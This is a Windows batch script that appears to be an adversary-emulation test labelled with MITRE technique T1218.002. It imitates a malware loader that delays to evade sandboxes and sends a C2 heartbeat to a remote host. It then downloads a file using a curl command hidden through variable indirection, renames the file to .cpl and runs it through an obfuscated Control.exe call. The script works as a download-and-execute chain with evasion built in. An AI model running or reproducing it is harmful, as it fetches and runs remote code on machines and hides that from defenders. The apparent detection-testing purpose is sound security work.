@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder variables - plain literals only
SET yktnwwf=%APPDATA%\8883\aef6565e
SET fpakbq=Macula-Stage0-8883
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8883-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=msedges.txt
SET fpldhe=8883
SET logfile=%APPDATA%\!yydue!\macula-simulations.log

REM Initial sandbox evasion delay
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_start>> "!logfile!" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_complete>> "!logfile!" 2>nul

REM C2 heartbeat (mandatory, non-obfuscated)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_complete>> "!logfile!" 2>nul

REM Random delay
SET /A delay=%RANDOM% %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start seconds=!delay!>> "!logfile!" 2>nul
timeout /t !delay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_complete>> "!logfile!" 2>nul

REM Create output directory
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: directory_create_start path=!yktnwwf!>> "!logfile!" 2>nul
if not exist "!yktnwwf!" mkdir "!yktnwwf!" >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: directory_create_complete>> "!logfile!" 2>nul

ping -n 8 127.0.0.1 >nul

REM Obfuscated download command using variable indirection
SET d1=c
SET d2=u
SET d3=r
SET d4=l
SET p1=-k
SET p2=-s
SET p3=-o
SET t1=!yktnwwf!\!edjwtl!
SET t2=!repbmqg!

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: download_start url=!repbmqg!>> "!logfile!" 2>nul
CALL SET dlcmd=%%d1%%%%d2%%%%d3%%%%d4%% %%p1%% %%p2%% %%p3%% "!t1!" "!t2!"
CALL %%dlcmd%% >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: download_complete>> "!logfile!" 2>nul

CHOICE /C Y /N /D Y /T 10 >nul

REM Check if download succeeded
if exist "!yktnwwf!\!edjwtl!" (
    SET ttp_result=1
    SET err_detail=
    
    REM Rename to CPL file
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_start old=!edjwtl! new=file.cpl>> "!logfile!" 2>nul
    move /y "!yktnwwf!\!edjwtl!" "!yktnwwf!\file.cpl" >nul 2>&1
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_complete>> "!logfile!" 2>nul
    
    REM Obfuscated LOLBIN execution with variable indirection
    SET l1=Cont
    SET l2=rol
    SET l3=.ex
    SET l4=e
    
    SET b1=!l1!
    SET b2=!l2!
    SET b3=!l3!
    SET b4=!l4!
    CALL SET binref=%%b1%%%%b2%%%%b3%%%%b4%%
    
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: execution_start bin=Control.exe arg=file.cpl>> "!logfile!" 2>nul
    CALL "%%binref%%" "!yktnwwf!\file.cpl" >nul 2>&1
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: execution_complete>> "!logfile!" 2>nul
) else (
    SET ttp_result=0
    SET err_detail=download_failed
)

REM Log TTP execution
echo [%DATE% %TIME%][!omxgazu!]: !yydue!-!fpldhe!-T1218.002|Control Panel=!ttp_result!:!err_detail!>> "!logfile!" 2>nul

timeout /t 15 /nobreak >nul
ENDLOCAL